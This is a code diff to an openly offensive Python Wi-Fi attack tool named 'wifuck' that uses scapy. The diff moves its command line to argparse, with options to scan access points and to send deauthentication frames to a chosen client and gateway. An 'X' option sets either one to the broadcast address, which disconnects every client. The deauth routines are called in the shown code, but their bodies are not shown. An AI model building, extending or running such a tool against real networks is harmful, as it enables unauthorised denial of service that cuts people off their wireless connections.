@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import subprocess, re, csv, sys, os, time, shutil
+import subprocess, re, csv, sys, os, time, shutil, argparse
 from datetime import datetime
 from scapy.all import *
 
@@ -12,15 +12,6 @@ B = '\033[34m'
 P = '\033[35m' 
 C = '\033[36m' 
 GR = '\033[37m'
-
-usage = G+'''
-  Usage;
-     - no args                    Start normally
-     <scan> or <s> or <-s>        Scan AP, you must specify network adapter  |   wifuck scan <network-adapter>
-     <deauth> or <d> or <-d>      Sending deauth package using scapy         |   wifuck deauth -a <network-adapter> -c <client> -g <gateway>
-                                  if <client> or <gateway> is equal to X,    |     
-                                  it's broadcast ff:ff:ff:ff:ff:ff           |   wifuck deauth -a <network-adapter> -c X -g X
-'''+W
 
 title = R +''' .S     S.    .S       
 .SS     SS.  .SS       
@@ -148,43 +139,35 @@ def scp_deauth(hacknic, client, hackbssid):
         
 def main():
     checker()
-    print(title)        
-    if len(sys.argv) == 1:
+    print(title)
+    parser = argparse.ArgumentParser()
+    parser.add_argument( "--scan", "-s",  help="Scan for AP", action="store_true")   
+    parser.add_argument( "--deauth", "-d", help="Deauth clients from AP", action="store_true") 
+    parser.add_argument( "--adapter", "-a", help="Select network adapter")   
+    parser.add_argument( "--client", "-c", help="Select client to attack ( type 'X' for broadcast)")
+    parser.add_argument( "--gateway", "-g", help="Select gateway to attack ( type 'X' for broadcast)")   
+    args = parser.parse_args()
+    if args.scan and args.adapter:
+        init(args.adapter)
+        get_AP(args.adapter)
+    if args.deauth:
+        adapter = args.adapter
+        client = args.client
+        gateway = args.gateway
+        if client == 'X':
+            client = 'ff:ff:ff:ff:ff:ff'
+        if gateway == 'X':
+            gateway = 'ff:ff:ff:ff:ff:ff'   
+        init(adapter)
+        print(scp_deauth(adapter,client,gateway))                 
+    elif len(sys.argv) == 1:
         hacknic = get_adapter()
         init(hacknic)
-        airc_deauth(get_AP(hacknic))
+        hacknic, hackbssid, hackchannel = get_AP(hacknic)
+        airc_deauth(hacknic, hackbssid, hackchannel)
         exit(-1)
     else:
-        try:
-            if 'scan' or 'deauth' in sys.argv: 
-                for a in sys.argv:
-                    if a == 'scan':
-                        try:
-                            print(sys.argv[2])
-                            init(sys.argv[2])
-                            get_AP(sys.argv[2])
-                        except:
-                            print("Error, invalid syntax")
-                    if a == 'deauth':
-                        try:
-                            adapter = (sys.argv[sys.argv.index('-a')+1])
-                            client = (sys.argv[sys.argv.index('-c')+1])
-                            if client == 'X':
-                                client = 'ff:ff:ff:ff:ff:ff'
-                            gateway = (sys.argv[sys.argv.index('-g')+1])
-                            if gateway == 'X':
-                                gateway = 'ff:ff:ff:ff:ff:ff'
-                            init(adapter)
-                            print(scp_deauth(adapter,client,gateway))
-                        except:
-                            print("Error, invalid syntax")
-                            print(usage)
-                    else:
-                        pass
-            else:
-                print(usage)
-        except:
-            print(usage)
-            exit(-1)
-
+        parser.print_help(sys.stderr)
+        sys.exit(1)
+      
 main()
